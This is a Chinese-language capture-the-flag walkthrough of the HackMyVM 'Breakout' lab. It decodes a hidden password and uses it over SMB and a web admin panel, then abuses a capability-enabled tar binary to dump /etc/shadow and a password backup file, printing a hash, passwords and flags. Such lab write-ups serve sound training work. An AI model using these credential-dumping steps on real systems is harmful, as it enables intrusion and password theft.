# Breakout

2024.12.29 https://hackmyvm.eu/machines/machine.php?vm=Breakout

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
20000/tcp open  dnp
```

先访问 80 web 首页，在 HTML 源码中发现提示：

```
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```

Brainfuck 解密后是: `.2uqPEfj3D<P'a-3`

在看看 445 上有什么，经过 enum4linux 枚举后，发现一个用户 cyber，尝试用上面得到的字符串当作密码，进行 smbmap：

```
smbmap -H 192.168.5.40 -u cyber -p ".2uqPEfj3D<P'a-3"
```

发现认证成功，但是 print$ 和 IPC$ 没有权限访问。

访问 10000 和 20000 的端口服务，发现是 https 的，用 cyber 和密码进行登陆，发现 20000 能登陆进去，alt + k 快捷键发现可以执行命令。

得到了 user flag：

```
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

经过枚举，发现 cap 程序中有:

```
/home/cyber/tar cap_dac_read_search=ep
```

进行利用：

```
/home/cyber/tar cvf shadow.tar /etc/shadow
/home/cyber/tar -xvf shadow.tar

root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:99999:7:::
```

但是使用 john 不能破解出来，在继续寻找，经过枚举发现 /var/backups/.old_pass.bak 是一个类似密码备份文件，继续使用 tar 将其转储出来:

```
/home/cyber/tar cvf /home/cyber/pass.tar .old_pass.bak
/home/cyber/tar -xvf pass.tar

[cyber@breakout ~]$ cat .old_pass.bak
Ts&4&YurgtRX(=~h
```

使用得到的密码切换到 root 用户，得到了最终的 flag(如果 su 切换不了，就创建一个反弹的 shll 给到 kali 上，就可以切换了)：

```
root@breakout:~# cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```
